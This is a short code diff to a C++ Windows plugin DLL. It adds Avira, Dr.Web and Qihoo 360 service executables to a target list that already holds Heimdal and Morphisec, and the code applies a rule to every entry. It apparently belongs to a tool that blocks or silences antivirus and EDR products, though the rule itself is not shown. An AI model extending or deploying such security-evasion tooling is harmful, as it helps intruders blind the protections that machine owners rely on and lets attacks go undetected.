@@ -112,6 +112,15 @@ extern "C" __declspec(dllexport) BOOL WINAPI PluginMain(void){
         L"%ProgramFiles%\\Heimdal Security\\Heimdal Agent\\Heimdal.Agent.exe",
         // Morphisec (memory protection / MTD)
         L"%ProgramFiles%\\Morphisec\\MorphisecService.exe",
+        // Avira
+        L"%ProgramFiles%\\Avira\\AntiVir Desktop\\avguard.exe",
+        L"%ProgramFiles%\\Avira\\Antivirus\\avguard.exe",
+        // Dr.Web
+        L"%ProgramFiles%\\DrWeb\\dwservice.exe",
+        L"%ProgramFiles%\\DrWeb\\SpIDer Guard.exe",
+        // Qihoo 360 Total Security
+        L"%ProgramFiles%\\360\\Total Security\\QHSafeSvc.exe",
+        L"%ProgramFiles(x86)%\\360\\Total Security\\QHSafeSvc.exe",
     };
     DWORD n=sizeof(targets)/sizeof(targets[0]);
     for(DWORD i=0;i<n;i++)_AddRule(sys,targets[i],(int)i);
